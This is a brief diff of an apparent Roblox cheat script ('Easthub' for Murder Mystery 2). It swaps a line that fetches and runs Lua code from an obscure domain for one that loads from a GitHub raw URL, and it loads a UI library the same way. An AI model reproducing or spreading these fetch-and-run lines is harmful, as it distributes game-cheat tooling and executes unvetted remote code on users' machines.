@@ -1,5 +1,5 @@
 getgenv().gui = false
-loadstring(game:HttpGet("https://egorikusa.space/cf55b4e511c93ae95ed52312.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/notugotskilz/scripts/main/Mm22", true))()
 
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 local Window = OrionLib:MakeWindow({Name = "Easthub-Mm2 [3.0]-Summer Update🏄", HidePremium = false, IntroText = "Easthub", IntroIcon = "rbxassetid://18170549235", Icon = "rbxassetid://18170549235", SaveConfig = true, ConfigFolder = "OrionTest"})
